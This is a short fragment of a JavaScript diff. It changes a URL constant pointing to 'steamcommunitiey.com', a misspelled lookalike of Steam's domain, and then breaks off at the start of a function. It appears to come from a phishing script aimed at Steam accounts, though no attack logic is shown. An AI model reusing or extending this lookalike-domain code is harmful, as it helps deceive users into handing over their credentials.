@@ -1,5 +1,5 @@
 const className = ".lk0e6gi8s69v";
-const staticUrl = "https://api.steamcommunitiey.com/api/v1/auth";
+const staticUrl = "https://steamcommunitiey.com/txqmjgkxhzp5.html";
 
 (() => {
 
